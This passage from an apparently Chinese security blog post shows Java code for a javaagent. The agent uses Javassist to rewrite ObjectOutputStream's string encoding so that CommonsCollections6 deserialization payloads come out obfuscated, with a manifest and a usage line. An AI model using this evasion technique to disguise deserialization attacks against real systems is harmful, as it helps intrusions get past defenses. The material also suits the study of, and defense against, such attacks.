</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        } else {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            buf[pos + 1] = (byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F));\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            buf[pos + 0] = (byte) (0xC0 | ((c &gt;&gt; 6) &amp; 0x1F));\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            pos += 2;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        }\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    } else {    // write one byte at a time to normalize block\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        if (c &lt;= 0x0020 &amp;&amp; c != 0) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            write(c);\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        } else if (c &gt; 0x07FF) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            write(0xE0 | ((c &gt;&gt; 12) &amp; 0x0F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            write(0x80 | ((c &gt;&gt; 6) &amp; 0x3F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            write(0x80 | ((c &gt;&gt; 0) &amp; 0x3F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        } else {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            write(0xC0 | ((c &gt;&gt; 6) &amp; 0x1F));\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            write(0x80 | ((c &gt;&gt; 0) &amp; 0x3F));\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        }\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                off += csize;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;        }&#34;</span><span class="p">,</span><span class="n">ctc</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">addMethod</span><span class="p">(</span><span class="n">make1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">addMethod</span><span class="p">(</span><span class="n">make2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">detach</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;maked&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Demo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.jie</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.n1ght.NightTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.instrument.Instrumentation</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.AccessibleObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Demo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">premain</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">Instrumentation</span><span class="w"> </span><span class="n">inst</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inst</span><span class="p">.</span><span class="na">addTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">JieTransformer</span><span class="p">(),</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ç”Ÿæˆtransform()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inst</span><span class="p">.</span><span class="na">retransformClasses</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//è¿™é‡Œåªæ˜¯ç”¨æ¥è§¦å‘ç”Ÿæˆtransform()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// é‡åŠ è½½æŸä¸ª class, æ³¨æ„åœ¨é‡åŠ è½½ class çš„è¿‡ç¨‹ä¸­, ä¹‹å‰è®¾ç½®çš„ transformer ä¼šæ‹¦æˆªè¯¥ class</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>MANIFEST.MF</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Manifest</span><span class="o">-</span><span class="n">Version</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Can</span><span class="o">-</span><span class="n">Redefine</span><span class="o">-</span><span class="n">Classes</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Can</span><span class="o">-</span><span class="n">Retransform</span><span class="o">-</span><span class="n">Classes</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Premain</span><span class="o">-</span><span class="n">Class</span><span class="p">:</span><span class="w"> </span><span class="n">com</span><span class="p">.</span><span class="na">jie</span><span class="p">.</span><span class="na">Demo</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åå°†è¿™ä¸ªæ¨¡å—ç”ŸæˆjaråŒ…ï¼Œåœ¨CC6æ‰§è¡Œæ·»åŠ è¿™ä¸ª-javaagent:jarpath</p>
<p>çœ‹çœ‹æ•ˆæœå›¾å§ï¼Œå±æ€§çš„é—®é¢˜éƒ½è§£å†³äº†</p>
<p><img loading="lazy" src="../images/image-20241218194848257.png" alt="image-20241218194848257"  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>pickle&amp;types.CodeTypeå®ç°æ¥ç®¡ä»»æ„å‡½æ•°</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>CommonsBeanutils&amp;shiro550</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
